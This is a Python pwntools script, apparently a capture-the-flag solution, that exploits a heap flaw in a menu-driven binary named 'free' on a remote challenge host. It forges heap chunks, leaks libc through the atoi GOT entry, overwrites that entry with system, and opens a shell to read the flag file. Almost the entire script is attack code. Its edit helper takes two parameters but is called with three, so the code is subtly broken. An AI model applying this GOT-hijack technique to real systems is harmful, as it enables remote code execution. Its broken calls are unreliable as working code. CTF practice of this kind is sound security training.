#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10208
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./free') , ELF('./libc.so.6')

def add( cho , data ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ':' , str( cho ) )
    y.sendafter( ':' , data )

def sho():
    y.sendafter( 'ice:' , '3' )

def edt( idx , data ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , data )

def dle( idx ):
    y.sendafter( 'ice:' , '4' )
    y.sendafter( ':' , str( idx ) )


# 0x602130

add( 'a' * 0x10 , 'A' * 0x20 )
add( 'b' * 0x10 , 'B' * 0x20 )
add( 'b' * 0x8 + p64( 0x31 ) , 'B' * 0x20 )

edt( 0 , 'a' * 0x10 , 'A' * 0x10 )

dle( 1 )

edt( 0 , 'a' * 0x10 + '\x01' , 'A' * 0x10 )

dle( 0 )
dle( 1 )

add( 'a' * 0x10 , 'A' * 0x20 )
edt( 0 , 'a' * 0x10 , p64( 0x602130 ) )

add( 'b' * 0x10 , 'B' * 0x20 )
add( 'c' * 0x10 , 'C' * 0x20 )
add( 'd' * 0x10 , 'D' * 0x20 )

edt( 4 , 'd' * 0x10 , 'D' * 8 + p64( e.got['atoi'] ) )

sho()

y.recvuntil('User 3')
y.recvuntil('d: ')

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['atoi']
log.success( 'libc -> %s' % hex( l.address ) )

edt( 3 , 'D' * 0x10 , p64( l.symbols['system'] ) )

y.sendline( 'sh;' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()